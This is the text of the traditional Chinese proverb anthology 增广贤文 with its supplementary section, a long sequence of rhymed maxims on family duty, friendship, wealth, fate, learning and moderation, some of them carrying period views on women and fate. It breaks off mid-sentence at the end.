上集昔时贤文，诲汝谆谆。集韵增广，多见多闻。观今宜鉴古，无古不成今。知己知彼，将心比心。酒逢知己饮，诗向会人吟。相识满天下，知心能几人？相逢好似初相识，到老终无怨恨心。近水知鱼性，近山识鸟音。易涨易退山溪水，易反易覆小人心。运去金成铁，时来铁似金。读书须用意，一字值千金。逢人且说三分话，未可全抛一片心。有意栽花花不发，无心插柳柳成荫。画虎画皮难画骨，知人知面不知心。钱财如粪土，仁义值千金。流水下滩非有意，白云出岫本无心。当时若不登高望，谁信东流海洋深？路遥知马力，日久见人心。两人一般心，无钱堪买金；一人一般心，有钱难买针。相见易得好，久住难为人。马行无力皆因瘦，人不风流只为贫。饶人不是痴汉，痴汉不会饶人。是亲不是亲，非亲却是亲。美不美，乡中水；亲不亲，故乡人。莺花犹怕春光老，岂可教人枉度春？相逢不饮空归去，洞口桃花也笑人。红粉佳人休使老，风流浪子莫教贫。在家不会迎宾客，出门方知少主人。黄芩无假，阿魏无真。客来主不顾，自是无良宾。良宾主不顾，应恐是痴人。贫居闹市无人问，富在深山有远亲。谁人背后无人说，哪个人前不说人？有钱道真语，无钱语不真。不信但看筵中酒，杯杯先劝有钱人。闹市挣钱，静处安身。来如风雨，去似微尘。长江后浪推前浪，世上新人换旧人。近水楼台先得月，向阳花木早逢春。古人不见今时月，今月曾经照古人。先到为君，后到为臣。莫道君行早，更有早行人。莫信直中直，须防仁不仁。山中有直树，世上无直人。自恨枝无叶，莫怨太阳偏。大家都是命，半点不由人。一年之计在于春，一日之计在于晨。一家之计在于和，一生之计在于勤。责人之心责己，恕己之心恕人。守口如瓶，防意如城。宁可人负我，切莫我负人。再三须慎意，第一莫欺心。虎生犹可近，人熟不堪亲。来说是非者，便是是非人。远水难救近火，远亲不如近邻。有茶有酒多兄弟，急难何曾见一人？人情似纸张张薄，世事如棋局局新。山中也有千年树，世上难逢百岁人。力微休负重，言轻莫劝人。无钱休入众，遭难莫寻亲。平生不做皱眉事，世上应无切齿人。士乃国之宝，儒为席上珍。若要断酒法，醒眼看醉人。求人须求英雄汉，济人须济急时无。渴时一滴如甘露，醉后添杯不如无。久住令人贱，频来亲也疏。酒中不语真君子，财上分明大丈夫。贫贱之交不可忘，糟糠之妻不下堂。出家如初，成佛有余。积金千两，不如明解经书。养子不教如养驴，养女不教如养猪。有田不耕仓廪虚，有书不读子孙愚。仓廪虚兮岁月乏，子孙愚兮礼仪疏。听君一席话，胜读十年书。人不通今古，马牛如襟裾。茫茫四海人无数，哪个男儿是丈夫？白酒酿成缘好客，黄金散尽为诗书。救人一命，胜造七级浮屠。城门失火，殃及池鱼。庭前生瑞草，好事不如无。欲求生富贵，须下死工夫。百年成之不足，一旦坏之有余。人心似铁，官法如炉。善化不足，恶化有余。水至清则无鱼，人至察则无徒。知者减半，愚者全无。在家由父，出嫁从夫。痴人畏妇，贤女敬夫。是非终日有，不听自然无。竹篱茅舍风光好，道院僧房终不如。宁可正而不足，不可邪而有余。宁可信其有，不可信其无。命里有时终须有，命里无时莫强求。道院迎仙客，书堂隐相儒。庭栽栖凤竹，池养化龙鱼。结交须胜己，似我不如无。但看三五日，相见不如初。人情似水分高下，世事如云任卷舒。会说说都是，不会说无理。磨刀恨不利，刀利伤人指。求财恨不多，财多害自己。知足常足，终身不辱；知止常止，终身不耻。有福伤财，无福伤己。失之毫厘，谬以千里。若登高必自卑，若涉远必自迩。三思而行，再思可矣。使口不如亲为，求人不如求己。小时是兄弟，长大各乡里。嫉财莫嫉食，怨生莫怨死。人见白头嗔，我见白头喜。多少少年郎，不到白头死。墙有缝，壁有耳。好事不出门，坏事传千里。若要人不知，除非己莫为。为人不做亏心事，半夜敲门心不惊。贼是小人，智过君子。君子固穷，小人穷斯滥矣。贫穷自在，富贵多忧。不以我为德，反以我为仇。宁向直中取，不可曲中求。人无远虑，必有近忧。知我者谓我心忧，不知我者谓我何求？晴天不肯去，直待雨淋头。成事莫说，覆水难收。是非只为多开口，烦恼皆因强出头。忍得一时之气，免得百日之忧。近来学得乌龟法，得缩头时且缩头。惧法朝朝乐，欺心日日忧。人生一世，草长一秋。月过十五光明少，人到中年万事休。儿孙自有儿孙福，莫为儿孙做马牛。为人莫做千年计，三十河东四十西。人生不满百，常怀千岁忧。今朝有酒今朝醉，明日愁来明日忧。路逢险处须回避，事到临头不自由。人贫不语，水平不流。一家养女百家求，一马不行百马忧。有花方酌酒，无月不登楼。三杯通大道，一醉解千愁。深山毕竟藏猛虎，大海终须纳细流。惜花须检点，爱月不梳头。大抵选她肌骨好，不搽红粉也风流。受恩深处宜先退，得意浓时便可休。莫待是非来入耳，从前恩爱反为仇。留得五湖明月在，不愁无处下金钩。休别有鱼处，莫恋浅滩头。去时终须去，再三留不住。忍一句，息一怒，饶一着，退一步。三十不豪，四十不富，五十将衰寻子助。生不认魂，死不认尸。一寸光阴一寸金，寸金难买寸光阴。黑发不知勤学早，转眼便是白头翁。父母恩深终有别，夫妻义重也分离。人生似鸟同林宿，大难来时各自飞。人善被人欺，马善被人骑。人无横财不富，马无夜草不肥。人恶人怕天不怕，人善人欺天不欺。善恶到头终有报，只盼来早与来迟。黄河尚有澄清日，岂能人无得运时？得宠思辱，居安思危。念念有如临敌日，心心常似过桥时。英雄行险道，富贵似花枝。人情莫道春光好，只怕秋来有冷时。送君千里，终有一别。但将冷眼观螃蟹，看你横行到几时。见事莫说，问事不知。闲事莫管，无事早归。假缎染就真红色，也被旁人说是非。善事可做，恶事莫为。许人一物，千金不移。龙生龙子，虎生虎儿。龙游浅水遭虾戏，虎落平阳被犬欺。一举首登龙虎榜，十年身到凤凰池。十年寒窗无人问，一举成名天下知。酒债寻常处处有，人生七十古来稀！养儿防老，积谷防饥。鸡豚狗彘之畜，无失其时，数口之家，可以无饥矣。当家才知盐米贵，养子方知父母恩。常将有日思无日，莫把无时当有时。树欲静而风不止，子欲养而亲不待。时来风送滕王阁，运去雷轰荐福碑。入门休问荣枯事，且看容颜便得知。官清司吏瘦，神灵庙祝肥。息却雷霆之怒，罢却虎豹之威。饶人算之本，输人算之机。好言难得，恶语易施。一言既出，驷马难追。道吾好者是吾贼，道吾恶者是吾师。路逢侠客须呈剑，不是才人莫献诗。三人同行，必有我师。择其善者而从之，其不善者而改之。欲昌和顺须为善，要振家声在读书。少壮不努力，老大徒伤悲。人有善愿，天必佑之。莫饮卯时酒，昏昏醉到酉。莫骂酉时妻，一夜受孤凄。种麻得麻，种豆得豆。天眼恢恢，疏而不漏。做官莫向前，作客莫在后。宁添一斗，莫添一口。螳螂捕蝉，岂知黄雀在后？不求金玉重重贵，但愿儿孙个个贤。一日夫妻，百世姻缘。百世修来同船渡，千世修来共枕眠。杀人一万，自损三千。伤人一语，利如刀割。枯木逢春犹再发，人无两度再少年。未晚先投宿，鸡鸣早看天。将相顶头堪走马，公侯肚内好撑船。富人思来年，穷人想眼前。世上若要人情好，赊去物品莫取钱。生死有命，富贵在天。击石原有火，不击乃无烟。人学始知道，不学亦徒然。莫笑他人老，终须还到老。和得邻里好，犹如拾片宝。但能守本分，终身无烦恼。大家做事寻常，小家做事慌张。大家礼义教子弟，小家凶恶训儿郎。君子爱财，取之有道。贞妇爱色，纳之以礼。善有善报，恶有恶报。不是不报，时候未到。万恶淫为首，百善孝当先。人而无信，不知其可也。一人道虚，千人传实。凡事要好，须问三老。若争小利，便失大道。家中不和邻里欺，邻里不和说是非。年年防饥，夜夜防盗。学者是好，不学不好。学者如禾如稻，不学如草如蒿。遇饮酒时须防醉，得高歌处且高歌。因风吹火，用力不多。不因渔夫引，怎能见波涛？无求到处人情好，不饮任他酒价高。知事少时烦恼少，识人多处是非多。世间好语书说尽，天下名山僧占多。进山不怕伤人虎，只怕人情两面刀。强中更有强中手，恶人须用恶人磨。会使不在家富豪，风流不用衣着多。光阴似箭，日月如梭。天时不如地利，地利不如人和。黄金未为贵，安乐值钱多。为善最乐，作恶难逃。羊有跪乳之恩，鸦有反哺之情。孝顺还生孝顺子，忤逆还生忤逆儿。不信但看檐前水，点点滴滴旧池窝。隐恶扬善，执其两端。妻贤夫祸少，子孝父心宽。已覆之水，收之实难。人生知足时常足，人老偷闲且是闲。处处绿杨堪系马，家家有路通长安。既坠釜甑，反顾无益。见者易，学者难。莫将容易得，便作等闲看。厌静还思喧，嫌喧又忆山。自从心定后，无处不安然。用心计较般般错，退后思量事事宽。道路各别，养家一般。由俭入奢易，从奢入俭难。知音说与知音听，不是知音莫与谈。点石化为金，人心犹未足。信了赌，卖了屋。他人观花，不涉你目。他人碌碌，不涉你足。谁人不爱子孙贤，谁人不爱千钟粟。奈五行，不是这般题目。莫把真心空计较，儿孙自有儿孙福。书到用时方恨少，事非经过不知难。天下无不是的父母，世上最难得者兄弟。与人不和，劝人养鹅；与人不睦，劝人架屋。但行好事，莫问前程。不交僧道，便是好人。河狭水激，人急计生。明知山有虎，莫向虎山行。路不铲不平，事不为不成。无钱方断酒，临老始读经。点塔七层，不如暗处一灯。堂上二老是活佛，何用灵山朝世尊。万事劝人休瞒昧，举头三尺有神明。但存方寸土，留与子孙耕。灭却心头火，剔起佛前灯。惺惺多不足，蒙蒙作公卿。众星朗朗，不如孤月独明。兄弟相害，不如友生。合理可作，小利不争。牡丹花好空入目，枣花虽小结实多。欺老莫欺小，欺人心不明。勤奋耕锄收地利，他时饱暖谢苍天。得忍且忍，得耐且耐，不忍不耐，小事成灾。相论逞英豪，家计渐渐退。贤妇令夫贵，恶妇令夫败。一人有庆，兆民咸赖。人老心未老，人穷志莫穷。人无千日好，花无百日红。黄蜂一口针，橘子两边分。世间痛恨事，最毒淫妇心。杀人可恕，情理不容。乍富不知新受用，乍贫难改旧家风。座上客常满，杯中酒不空。屋漏更遭连夜雨，行船又遇打头风。笋因落箨方成竹，鱼为奔波始化龙。记得少年骑竹马，转眼又是白头翁。礼义生于富足，盗贼出于赌博。天上众星皆拱北，世间无水不朝东。士为知己者死，女为悦己者容。色即是空，空即是色。君子安贫，达人知命。良药苦口利于病，忠言逆耳利于行。顺天者昌，逆天者亡。有缘千里来相会，无缘对面不相逢。有福者昌，无福者亡。人为财死，鸟为食亡。夫妻相和好，琴瑟与笙簧。红粉易妆娇态女，无钱难作好儿郎。有子之人贫不久，无儿无女富不长。善必寿老，恶必早亡。爽口食多偏作病，快心事过恐遭殃。富贵定要依本分，贫穷不必再思量。画水无风空作浪，绣花虽好不闻香。贪他一斗米，失却半年粮。争他一脚豚，反失一肘羊。龙归晚洞云犹湿，麝过春山草木香。平生只会说人短，何不回头把己量？见善如不及，见恶如探汤。人穷志短，马瘦毛长。自家心里急，他人未知忙。贫无达士将金赠，病有高人说药方。触来莫与竞，事过心清凉。秋来满山多秀色，春来无处不花香。凡人不可貌相，海水不可斗量。清清之水为土所防，济济之士为酒所伤。蒿草之下或有兰香，茅茨之屋或有侯王。无限朱门生饿殍，几多白屋出公卿。酒里乾坤大，壶中日月长。拂石坐来春衫冷，踏花归去马蹄香。万事前身定，浮生空自忙。叫月子规喉舌冷，宿花蝴蝶梦魂香。一言不中，千言不用。一人传虚，百人传实。万金良药，不如无疾。千里送鹅毛，礼轻情义重。世事如明镜，前程暗似漆。君子怀刑，小人怀惠。架上碗儿轮流转，媳妇自有做婆时。人生一世，如驹过隙。良田万顷，日食一升。大厦千间，夜眠八尺。千经万典，孝义为先。天上人间，方便第一。一字入公门，九牛拔不出。八字衙门向南开，有理无钱莫进来。欲求天下事，须用世间财。富从升合起，贫因不算来。近河不得枉使水，近山不得枉烧柴。家无读书子，官从何处来？慈不掌兵，义不掌财。一夫当关，万夫莫开。万事不由人计较，一生都是命安排。白云本是无心物，却被清风引出来。慢行急行，逆取顺取。命中只有如许财，丝毫不可有闪失。人间私语，天闻若雷。暗室亏心，神目如电。一毫之恶，劝人莫作。一毫之善，与人方便。亏人是祸，饶人是福，天眼恢恢，报应甚速。圣贤言语，神钦鬼服。人各有心，心各有见。口说不如身逢，耳闻不如目见。见人富贵生欢喜，莫把心头似火烧。养兵千日，用在一时。国清才子贵，家富小儿娇。利刀割体疮犹使，恶语伤人恨不消。公道世间唯白发，贵人头上不曾饶。有才堪出众，无衣懒出门。为官须作相，及第必争先。苗从地发，树由枝分。宅里燃火，烟气成云。以直报怨，知恩报恩。红颜今日虽欺我，白发他时不放君。借问酒家何处有，牧童遥指杏花村。父子和而家不退，兄弟和而家不分。一片云间不相识，三千里外却逢君。官有公法，民有私约。平时不烧香，临时抱佛脚。幸生太平无事日，恐防年老不多时。国乱思良将，家贫思良妻。池塘积水须防旱，田地深耕足养家。根深不怕风摇动，树正何愁月影斜。争得猫儿，失却牛脚。愚者千虑，必有一得，智者千虑，必有一失。始吾于人也，听其言而信其行。今吾于人也，听其言而观其行。哪个梳头无乱发，情人眼里出西施。珠沉渊而川媚，玉韫石而山辉。夕阳无限好，只恐不多时。久旱逢甘霖，他乡遇故知；洞房花烛夜，金榜题名时。惜花春起早，爱月夜眠迟。掬水月在手，弄花香满衣。桃红李白蔷薇紫，问着东君总不知。教子教孙须教义，栽桑栽柘少栽花。休念故乡生处好，受恩深处便为家。学在一人之下，用在万人之上。一日为师，终生为父。忘恩负义，禽兽之徒。劝君莫将油炒菜，留与儿孙夜读书。书中自有千钟粟，书中自有颜如玉。莫怨天来莫怨人，五行八字命生成。莫怨自己穷，穷要穷得干净；莫羡他人富，富要富得清高。别人骑马我骑驴，仔细思量我不如，待我回头看，还有挑脚汉。路上有饥人，家中有剩饭。积德与儿孙，要广行方便。作善鬼神钦，作恶遭天遣。积钱积谷不如积德，买田买地不如买书。一日春工十日粮，十日春工半年粮。疏懒人没吃，勤俭粮满仓。人亲财不亲，财利要分清。十分伶俐使七分，常留三分与儿孙，若要十分都使尽，远在儿孙近在身。君子乐得做君子，小人枉自做小人。好学者则庶民之子为公卿，不好学者则公卿之子为庶民。惜钱莫教子，护短莫从师。记得旧文章，便是新举子。人在家中坐，祸从天上落。但求心无愧，不怕有后灾。只有和气去迎人，哪有相打得太平。忠厚自有忠厚报，豪强一定受官刑。人到公门正好修，留些阴德在后头。为人何必争高下，一旦无命万事休。山高不算高，人心比天高。白水变酒卖，还嫌猪无糟。贫寒休要怨，宝贵不须骄。善恶随人作，祸福自己招。奉劝君子，各宜守己。只此呈示，万无一失。（上集完） 下集前人俗语，言浅理深。补遗增广，集成书文。世上无难事，只怕不专心。成人不自在，自在不成人；金凭火炼方知色，与人交财便知心。乞丐无粮，懒惰而成。勤俭为无价之宝，节粮乃众妙之门。省事俭用，免得求人。量大祸不在，机深祸亦深。善为至宝深深用，心作良田世世耕。群居防口，独坐防心。体无病为富贵，身平安莫怨贫。败家子弟挥金如土，贫家子弟积土成金。富贵非关天地，祸福不是鬼神。安分贫一时，本分终不贫。不拜父母拜干亲，弟兄不和结外人。人过留名，雁过留声。择子莫择父，择亲莫择邻。爱妻之心是主，爱子之心是亲。事从根起，藕叶连心。祸与福同门，利与害同城。清酒红人脸，财帛动人心！宁可荤口念佛，不可素口骂人。有钱能说话，无钱话不灵。岂能尽如人意？但求不愧吾心。不说自己井绳短，反说他人箍井深。恩爱多生病，无钱便觉贫。只学斟酒意，莫学下棋心。孝莫假意，转眼便为人父母。善休望报，回头只看汝儿孙！口开神气散，舌出是非生！弹琴费指甲，说话费精神。千贯买田，万贯结邻。人言未必犹尽，听话只听三分。隔壁岂无耳，窗外岂无人？财可养生须注意，事不关己不劳心。酒不护贤，色不护病；财不护亲，气不护命！一日不可无常业，安闲便易起邪心！炎凉世态，富贵更甚于贫贱；嫉妒人心，骨肉更甚于外人！瓜熟蒂落，水到渠成。人情送匹马，买卖不饶针！过头饭好吃，过头话难听！事多累了自己，田多养了众人。怕事忍事不生事自然无事；平心静心不欺心何等放心！天子至尊不过于理，在理良心天下通行。好话不在多说，有理不在高声！一朝权在手，便把令来行。甘草味甜人可食，巧言妄语不可听。当场不论，过后枉然。贫莫与富斗，富莫与官争！官清难逃猾吏手，衙门少有念佛人！家有千口，主事一人。父子竭力山成玉，弟兄同心土变金。当事者迷，旁观者清。怪人不知理，知理不怪人。未富先富终不富，未贫先贫终不贫。少当少取，少输当赢！饱暖思淫欲，饥寒起盗心！蚊虫遭扇打，只因嘴伤人！欲多伤神，财多累心！布衣得暖真为福，千金平安即是春。家贫出孝子，国乱显忠臣！宁做太平犬，莫做离乱人！人有几等，官有几品。理不卫亲，法不为民。自重者然后人重，人轻者便是自轻。自身不谨，扰乱四邻。快意事过非快意，自古败名因败事。伤身事莫做，伤心话莫说。小人肥口，君子肥身。地不生无名之辈，天不生无路之人。一苗露水一苗草，一朝天子一朝臣。读未见书如逢良友，见已读书如逢故人。福满须防有祸，凶多料必无争。不怕三十而死，只怕死后无名。但知江湖者，都是薄命人。不怕方中打死人，只知方中无好人。说长说短，宁说人长莫说短；施恩施怨，宁施人恩莫施怨。育林养虎，虎大伤人。冤家抱头死，事要解交人。卷帘归乳燕，开扇出苍蝇。爱鼠常留饭，怜蛾灯罩纱。人命在天，物命在人。奸不通父母，贼不通地邻。盗贼多出赌博，人命常出奸情。治国信谗必杀忠臣，治家信谗必疏其亲。治国不用佞臣，治家不用佞妇。好臣一国之宝，好妇一家之珍。稳的不滚，滚的不稳。儿不嫌母丑，狗不嫌家贫。君子千钱不计较，小人一钱恼人心。人前显贵，闹里夺争。要知江湖深，一个不做声。知止自当出妄想，安贫须是禁奢心。初入行业，三年事成；初吃馒头，三年口生。家无生活计，坐吃如山崩。家有良田万顷，不如薄艺在身；艺多不养家，食多嚼不赢。命中只有八合米，走遍天下不满升。使心用心，反害自身。国家无空地，世上无闲人。妙药难医怨逆病，混财不富穷命人。耽误一年春，十年补不清；人能处处能，草能处处生。会打三班鼓，也要几个人。人不走不亲，水不打不浑。三贫三富不到老，十年兴败多少人！买货买得真，折本折得轻；不怕问到，只怕倒问。人强不如货强，价高不如口便。会买买怕人，会卖卖怕人。只只船上有梢公，天子足下有贫亲。既知莫望，不知莫向。在一行，练一行；穷莫失志，富莫癫狂。天欲令其灭亡，必先让其疯狂。梢长人胆大，梢短人心慌。隔行莫贪利，久炼必成钢。瓶花虽好艳，相看不耐长。早起三光，迟起三慌。未来休指望，过去莫思量；时来遇好友，病去遇良方。布得春风有夏雨，哈得秋风大家凉。晴带雨伞，饱带饥粮。满壶全不响，半壶响叮当。久利之事莫为，众争之地莫往。老医迷旧疾，朽药误良方；该在水中死，不在岸上亡。舍财不如少取，施药不如传方。倒了城墙丑了县官，打了梅香丑了姑娘。燕子不进愁门，耗子不钻空仓。苍蝇不叮无缝蛋，谣言不找谨慎人。一人舍死，万人难当。人争一口气，佛争一炷香。门为小人而设，锁乃君子之防。舌咬只为揉，齿落皆因眶。硬弩弦先断，钢刀刃自伤。贼名难受，龟名难当。好事他人未见讲，错处他偏说得长。男子无志纯铁无钢，女子无志烂草无瓤。生男欲得成龙犹恐成獐，生女欲得成凤犹恐成虎。养男莫听狂言，养女莫叫离母。男子失教必愚顽，女子失教定粗鲁。生男莫教弓与弩，生女莫教歌与舞。学成弓弩沙场灾，学成歌舞为人妾。财交者密，财尽者疏。婚姻论财，夫妻之道。色娇者亲，色衰者疏。少实胜虚，巧不如拙。百战百胜不如无争，万言万中不如一默。有钱不置怨逆产，冤家宜解不宜结。近朱者赤，近墨者黑。一个山头一只虎，恶龙难斗地头蛇。出门看天色，进门看脸色。商贾买卖如施舍，买卖公平如积德。天生一人，地生一穴。家无三年之积不成其家，国无九年之积不成其国。男子有德便是才，女子无才便是德。有钱难买子孙贤，女儿不请上门客。男大当婚女大当嫁，不婚不嫁惹出笑话。谦虚美德，过谦即诈。自己跌倒自己爬，望人扶持都是假。人不知己过，牛不知力大。一家饱暖千家怨，一物不见赖千家。当面论人惹恨最大，是与不是随他说吧！谁人做得千年主，转眼流传八百家。满载芝麻都漏了，还在水里捞油花！皇帝坐北京，以理统天下。五百年前共一家，不同祖宗也同华！学堂大如官厅，人情大过王法。找钱犹如针挑土，用钱犹如水推沙！害人之心不可有，防人之心不可无！不愁无路，就怕不做。须向根头寻活计，莫从体面下功夫！祸从口出，病从口入。药补不如肉补，肉补不如养补。思虑之害甚于酒色，日日劳力上床呼疾。人怕不是福，人欺不是辱。能言不是真君子，善处方为大丈夫！为人莫犯法，犯法身无主。姊妹同肝胆，弟兄同骨肉。慈母多误子，悍妇必欺夫！君子千里同舟，小人隔墙易宿。文钱逼死英雄汉，财不归身恰是无。妻子如衣服，弟兄似手足。衣服补易新，手足断难续。盗贼怨失主，不孝怨父母。一时劝人以口，百世劝人以书。我不如人我无其福，人不如我我常知足！捡金不忘失金人，三两黄铜四两福。因祸得福，求赌必输。一言而让他人之祸，一忿而折平生之福。天有不测风云，人有旦夕祸福。不淫当斋，淡饱当肉。缓步当车，无祸当福。男无良友不知己之有过，女无明镜不知面之精粗。事非亲做，不知难处。十年易读举子，百年难淘江湖！积钱不如积德，闲坐不如看书。思量挑担苦，空手做是福。时来易借银千两，运去难赊酒半壶。天晴打过落雨铺，少时享过老来福。与人方便自己方便，一家打墙两家好看。当面留一线，过后好相见。入门掠虎易，开口告人难。手指要往内撇，家丑不可外传。浪子出于祖无德，孝子出于前人贤。货离乡贵，人离乡贱。树挪死，人挪活。在家千日好，出门处处难。三员长者当官员，几个明人当知县？明人自断，愚人官断。人怕三见面，树怕一墨线。村夫硬似铁，光棍软如棉。不是撑船手，怎敢拿篙竿！天下礼仪无穷，一人知识有限。一人不得二人计，宋江难结万人缘。家有三亩田，不离衙门前，乡间无强汉，衙门就饿饭。人人依礼仪，天下不设官。衙门钱，眼睛钱；田禾钱，千万年。诗书必读，不可做官。为人莫当官，当官皆一般。换了你我去，恐比他还贪。官吏清廉如修行，书差方便如行善。靠山吃山，种田吃田。吃尽美味还是盐，穿尽绫罗还是棉。一夫不耕，全家饿饭，一女不织，全家受寒。金银到手非容易，用时方知来时难。先讲断，后不乱，免得藕断丝不断。听人劝，得一半。不怕慢，只怕站。逢快莫赶，逢贱莫懒。谋事在人，成事在天！长路人挑担，短路人赚钱。宁卖现二，莫卖赊三。赚钱往前算，折本往后算。小小生意赚大钱，七十二行出状元。自己无运至，却怨世界难。胆大不如胆小，心宽甚如屋宽。妻贤何愁家不富，子孙何须受祖田。是儿不死，是财不散。财来生我易，我去生财难。十月滩头坐，一日下九滩。结交一人难上难，得罪一人一时间。借债经商，卖田还债；赊钱起屋，卖屋还钱。修起庙来鬼都老，拾得秤来姜卖完。不嫖莫转，不赌莫看。节食以去病，少食以延年。豆腐多了是包水，梢公多了打烂船。无口过是，无眼过难。无身过易，无心过难。不会凫水怨河湾，不会犁田怨枷担。他马莫骑，他弓莫挽。要知心腹事，但听口中言。宁在人前全不会，莫在人前会不全。事非亲见，切莫乱谈。打人莫打脸，骂人莫骂短。好言一句三冬暖，话不投机六月寒。人上十口难盘，帐上万元难还。放债如施，收债如讨。告状讨钱，海底摸盐。衙门深似海，弊病大如天。银钱莫欺骗，牛马不好变。好汉莫被人识破，看破不值半文钱。狗咬对头人，雷打三世冤。不卖香烧无剩钱，井水不打不满边。事宽则园，太久则偏。高人求低易，低人求高难。有钱就是男子汉，无钱就是汉子难。人上一百，手艺齐全。难者不会，会者不难。生就木头造就船，砍的没得车的圆。心不得满，事不得全。鸟飞不尽，话说不完。人无喜色休开店，事不遂心莫怨天。选婿莫选田园，选女莫选嫁奁。红颜女子多薄命，福人出在丑人边。人将礼义为先，树将花果为园。临危许行善，过后心又变。天意违可以人回，命早定可以心挽。强盗口内出赦书，君子口中无戏言。贵人语少，贫子话多。快里须斟酌，耽误莫迟春。读过古华佗，不如见症多。东屋未补西屋破，前帐未还后又拖。今年又说明年富，待到明年差不多。志不同己，不必强合。莫道坐中安乐少，须知世上苦情多。本少利微强如坐，屋檐水也滴得多。勤俭持家富，谦恭受益多。细处不断粗处断，黄梅不落青梅落。见钱起意便是贼，顺手牵羊乃为盗。要做快活人，切莫寻烦恼。要做长寿人，莫做短命事。要做有后人，莫做无后事。不经一事，不长一智。宁可无钱使，不可无行止。栽树要栽松柏，结交要结君子。秀才不出门，能知天下事。钱多不经用，儿多不耐死。弟兄争财家不穷不止，妻妾争风夫不死不止。男人有志，妇人有势。夫人死百将临门，将军死一卒不至。天旱误甲子，人穷误口齿。百岁无多日，光阴能几时？父母养其身，自己立其志。待有余而济人，终无济人之日；待有闲而读书，终无读书之时。此书传后世，句句必精读，其中礼和义，奉劝告世人。勤奋读，苦发奋，走遍天涯如游刃。【新增广贤文】尊师以重道，爱众而亲仁。钱财如粪土，仁义值千金。作事须循天理，出言要顺人心。处富贵地，要矜持贫贱的痛痒，当少壮时，须体念衰老的辛酸。孝当竭力，非徒养身。鸦有反哺之孝，羊知跪乳之恩。打虎还要亲兄弟，出阵还须父子兵。父子和而家不败，弟兄和而家不分。知己知彼，将心比心。责人之心责己，爱己之心爱人。贪爱沉溺即苦海，利欲炽燃是火坑。随时莫起趋时念，脱俗休存矫俗心。昼夜惜阴，夜坐惜灯。读书须用意，一字值千金。平生不作皱眉事，世上应无切齿人。近水知鱼性，近山识鸟音。路遥知马力，日久见人心。饶人不是痴汉，痴汉不会饶人。不说自己桶索短，但怨人家箍井深。美不美，乡中水；亲不亲，故乡人。割不断的亲，离不开的邻。但行好事，莫问前程。钝鸟先飞，大器晚成。一年之计在于春，一日之计在于寅。一家之计在于和，一生之计在于勤。无病休嫌瘦，身安莫怨贫。岂能尽如人意，但求无愧人心。偏听则暗，兼听则明。耳闻是虚，眼见是实。毋施小惠而伤大体，毋借公论而快私情。毋以已长而形人之短，毋因已拙而忌人之能。平日不作亏心事，半夜敲门心不惊。牡丹花好空入目，枣花虽小结实成。汝惟不矜，天下莫与汝争能；汝惟不伐，天下莫与汝争功。明不伤察，直不过矫。仁能善断，清能有容。不自是而露才，不轻试以幸功。受享不逾分外，修持不减分中。肝肠煦若春风，虽囊乏一文，还怜茕独；气骨清如秋水，纵家徒四壁，终傲王公。早把甘旨勤奉养，夕阳光阴不多时。得宠思辱，居安思危。成名每在穷苦日，败事多因得意时。许人一物，千金不移。一言既出，驷马难追。博学而笃志，切问而近思。惜钱休教子，护短莫从师。须知孺子可教，勿谓童子何知。静坐常思已过，闲谈莫论人非。三人同行，必有我师，择其善者而从，其不善者改之。狎昵恶少，久必受其累；屈志老成，急则可相依。心口如一，童叟无欺。人有善念，天必佑之。过则无惮改，独则毋自欺。道吾好者是吾贼，道吾恶者是吉师。学不尚行，马牛而襟裾。结交须胜已，似我不如无。同君一席话，胜读十年书。水至清，则无鱼；人至察，则无徒。宁可正而不足，不可斜而有余。认真还自在，作假费功夫。是非朝朝有，不听自然无。聪明逞尽，惹祸招灾。富从升合起，贫因不算来。用人不宜刻，刻则思效者去；交友不宜滥，滥则贡谀者来。乐不可极，乐极生哀；欲不可纵，纵欲成灾。言顾行，行顾言。不作风波于世上，但留清白在人间。勿因群疑而阻独见，勿任已意而废人言。自处超然，处人蔼然。得意淡然，失意泰然。由俭入奢易，由奢入俭难。枯木逢春犹再发，人无两度再少年。儿孙胜于我，要钱做甚么；儿孙不如我，要钱做甚么。谦恭待人，忠厚传家。不学无术，读书便佳。与治同道罔不兴，与乱同事罔不亡。居身务期质朴，训子要有义方。富若不教子，钱谷必消灭。贵若不教子，衣冠受不长。人无远虑，必有近忧。勿临渴而掘井，宜未雨而绸缪。酒虽痒性还乱性，水能载舟亦覆舟。克已者，触事皆成药石；尤人者，启口即是戈矛。儿孙自有儿孙福，莫与儿孙做牛马。深山毕竟藏猛虎，大海终须纳细流。休向君子诌媚，君子原无私惠；休与小人为仇，小人自我对头。登高必自卑，若涉远必自迩。磨刀恨不利，刀利伤人指；求财恨不多，财多终累已。居视其所亲，达视其所举；富视其所不为，贫视其所不取。知足常足，终身不辱；知止常止，终身不耻。君子爱财，取之有道；小人放利，不顾天理。悖入亦悖出，害人终害已。身欲出樊笼外，心要在腔子里。勿偏信而为奸所欺，勿自任而为气所使。使口不如自走，求人不如求已。处骨肉之变，宜从容不宜激烈；当家庭之衰，宜惕厉不宜委靡。务下学而上达，毋舍近而趋远。量入为出，凑少成多。溪壑易填，人心难满。用人与教人，二者却相反，用人取其长，教人责其短。仕宦芳规清、慎、勤，饮食要诀缓、暖、软。留心学到古人难，立脚怕随流俗转。凡是自是，便少一是。有短护短，更添一短。好问则裕，自用则小。勿营华屋，勿作营巧。若争小可，便失大道。但能依本分，终须无烦恼。有言逆于汝心，必求诸道；有言逊于汝志，必求诸非道。吃得亏，坐一堆；要得好，大做小。志宜高而身宜下，胆欲大而心欲小。学者如禾如稻，不学者如蒿如草。唇亡齿必寒，教弛富难保。书中结良友，千载奇逢；门内产贤郎，一家活宝。狗不嫌家贫，儿不嫌母丑。勿贪意外之财，勿饮过量之酒。进步便思退步，着手先图放手。责善勿过高，当思其可从。攻恶勿太严，要使其可受。和气致祥，乖气致戾。玩人丧德，玩物丧志。门内有君子，门外君子至；门内有小人，门外小人至。趋炎虽暖，暖后更觉寒增；食蔗能甘，甘余更生苦趣。家庭和睦，蔬食尽有余欢；骨肉乖违，珍馐亦减至味。先学耐烦，切莫使气。性躁心粗，一生不济。得时莫夸能，不遇休妒世。物盛则必衰，有隆还有替。路径仄处，留一步与人行；滋味浓时，减三分让人嗜。为人要学大莫学小，志气一卑污了，品格难乎其高；持家要学小莫学大，门面一 